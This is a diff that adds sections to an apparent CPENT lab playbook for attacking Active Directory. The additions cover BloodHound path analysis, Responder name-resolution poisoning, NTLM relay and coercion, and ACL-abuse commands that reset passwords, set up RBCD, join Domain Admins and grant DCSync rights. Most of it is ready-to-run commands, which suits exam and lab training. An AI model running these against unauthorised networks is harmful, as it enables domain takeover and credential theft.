@@ -26,6 +26,37 @@ bin/cpent ev "crackmapexec smb <dc-ip> -u <u> -p <p> --users --groups --shares" 
 bin/cpent ev "nltest /domain_trusts" --ip <dc-ip> --zone active-directory --remote winrm --user <u> --secret '<p>'
 ```
 
+**BloodHound — what to look for** (don't just collect, analyse):
+- Mark owned nodes, then **Shortest Paths to Domain Admins** from owned.
+- Pre-built queries: Kerberoastable users, AS-REP-roastable users, unconstrained-delegation
+  hosts, "Find computers where Domain Users can RDP/PSRemote".
+- ACL edges you can abuse: `GenericAll`, `GenericWrite`, `WriteDacl`, `WriteOwner`,
+  `AddMember`, `ForceChangePassword`, `AllowedToDelegate` (see ACL abuse below).
+
+## LLMNR/NBT-NS/mDNS poisoning & NTLM relay (often your FIRST AD foothold)
+
+When you have **no creds** on a segment, poison name resolution to capture auth, then crack
+or relay it. This is a CPENT staple — try it early.
+
+```
+# 1. Capture NetNTLMv2 hashes by poisoning LLMNR/NBT-NS/mDNS:
+bin/cpent ev "responder -I <iface> -wv" --ip <segment> --zone active-directory --label responder
+#    hashes land in /usr/share/responder/logs/ → crack:  hashcat -m 5600 hash.txt rockyou.txt
+
+# 2. Find relay targets (SMB signing NOT required/enabled):
+bin/cpent ev "nxc smb <range> --gen-relay-list relaytargets.txt" --ip <range> --zone active-directory
+
+# 3. RELAY instead of crack (turn off SMB+HTTP in Responder.conf first):
+#    capture → relay to a target where the victim is local admin:
+bin/cpent ev "impacket-ntlmrelayx -tf relaytargets.txt -smb2support -c 'whoami'" --ip <range> --zone active-directory
+#    add  -i  for an interactive SMB client,  --delegate-access  for RBCD,
+#    or relay to LDAP(S):  -t ldaps://<dc>  --escalate-user <you>  (ACL/RBCD escalation)
+```
+
+Coercion to *force* a privileged machine to authenticate (feed the relay): PetitPotam
+(`petitpotam.py`), PrinterBug/SpoolSample (`printerbug.py`), or `coercer coerce`. Relaying a
+**DC's** machine auth to LDAP → RBCD or shadow-credentials → DC takeover.
+
 ## Kerberos — easy early wins, always try
 
 ```
@@ -52,6 +83,31 @@ psexec.py -hashes :<ntlm> <domain>/<u>@<t>        # pass-the-hash
 wmiexec.py <domain>/<u>:<p>@<t>
 evil-winrm -i <t> -u <u> -H <hash>
 crackmapexec smb <subnet>/24 -u <u> -H <hash> -x 'whoami'   # spray + exec
+```
+
+## ACL abuse (the BloodHound edges — frequently the path to DA)
+
+Turn a dangerous right over a principal into control. `bloodyAD`, `impacket`, or PowerView:
+
+```
+# ForceChangePassword — reset a victim's password you have this right over:
+bloodyAD -u <you> -p <pw> -d <dom> --host <dc> set password <victim> 'NewPass123!'
+net rpc password "<victim>" "NewPass123!" -U "<dom>/<you>%<pw>" -S <dc>     # or via rpc
+
+# GenericAll / GenericWrite on a USER → targeted Kerberoast (set a fake SPN, roast, unset):
+targetedKerberoast.py -u <you> -p <pw> -d <dom>
+#   or shadow credentials if PKINIT is available (certipy/pywhisker) → asktgt with the cert.
+
+# GenericAll / GenericWrite on a COMPUTER → RBCD:
+#   set msDS-AllowedToActOnBehalfOfOtherIdentity to a computer you control, then S4U:
+bloodyAD -u <you> -p <pw> -d <dom> --host <dc> add rbcd <target$> <controlled$>
+getST.py -spn cifs/<target> -impersonate Administrator '<dom>/<controlled$>:<pw>'
+
+# AddMember — add yourself to a privileged group:
+net rpc group addmem "Domain Admins" "<you>" -U "<dom>/<you>%<pw>" -S <dc>
+
+# WriteDacl / WriteOwner → grant yourself DCSync on the domain, then dump:
+dacledit.py -action write -rights DCSync -principal <you> -target-dn '<domain DN>' <dom>/<you>:<pw>
 ```
 
 ## Credential extraction
